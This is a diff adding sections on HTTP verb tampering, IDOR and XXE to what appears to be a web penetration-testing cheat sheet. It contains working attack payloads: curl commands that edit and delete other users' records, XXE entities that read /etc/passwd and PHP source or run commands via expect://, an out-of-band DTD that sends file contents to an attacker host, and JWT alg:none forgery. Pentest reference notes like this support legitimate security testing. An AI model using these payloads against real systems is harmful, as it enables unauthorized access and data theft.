@@ -26,6 +26,40 @@ Rails example: `User.new(params[:user])` + sending `admin=true`.
 
 **Finding it:** look for register/profile/update endpoints, compare the object's full field list (from source or responses) against what the form sends, then try adding the privileged fields. Real cases: GitHub 2012, Shopify admin panel.
 
+## HTTP Verb Tampering
+Auth/filters often apply to one method only. Try other verbs to bypass.
+```bash
+curl -i -X OPTIONS http://t/admin/      # list allowed methods
+curl -i -X HEAD http://t/admin/reset.php   # HEAD/GET may skip a POST-only auth check
+```
+- **Config bypass:** Apache `<Limit GET>`, Tomcat `<http-method>GET</http-method>`, ASP `verbs="GET"` → only that verb is protected; use another.
+- **Logic bypass:** code filters `$_POST["x"]` but then uses `$_REQUEST["x"]` → send the param via GET to skip the filter (classic SQLi-via-verb). Fuzz verbs: `wfuzz -z file,verbs.txt -X FUZZ ...`.
+- **Fix:** apply auth/validation to *all* methods; disable unused verbs.
+
+## IDOR (Insecure Direct Object Reference)
+App exposes an object ref (`?uid=2`, `/api/profile/2`) with no server-side authorization check → change it to read/modify others' data.
+```bash
+curl "http://t/documents.php?uid=3"                 # increment the ID
+# mass-pull in a loop; or APIs:
+curl -X PUT -d '{"uid":2,"name":"x"}' http://t/api/profile/2     # edit another user
+curl -X DELETE http://t/api/profile/11
+```
+- **Encoded refs:** decode and tamper — `base64 -d`, `xxd -r -p`, md5 of sequential ints; weak JWTs via `jwt_tool ... -S none` (alg:none).
+- Discover params with **Arjun**/ffuf. **Fix:** server-side authorization on every object, UUIDs (not sequential), rate-limit + log.
+
+## XXE (XML External Entity)
+App parses user XML with external entities enabled → file read, SSRF, sometimes RCE.
+```xml
+<!-- local file read -->
+<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><r>&xxe;</r>
+<!-- PHP source via filter -->
+<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">
+<!-- RCE if expect:// enabled -->
+<!ENTITY xxe SYSTEM "expect://id">
+```
+- **Blind/OOB** (no output reflected): host an external DTD that exfils via `http://<me>/?c=%file;` (OOB) or triggers a parse error containing the file (error-based). Automate with **XXEinjector**.
+- **Fix:** disable DTD / external-entity processing in the parser; validate input; patch libs.
+
 ## Server-side injection (reference)
 Payloads below run `id` as a benign proof — swap for the real target action in a test.
 
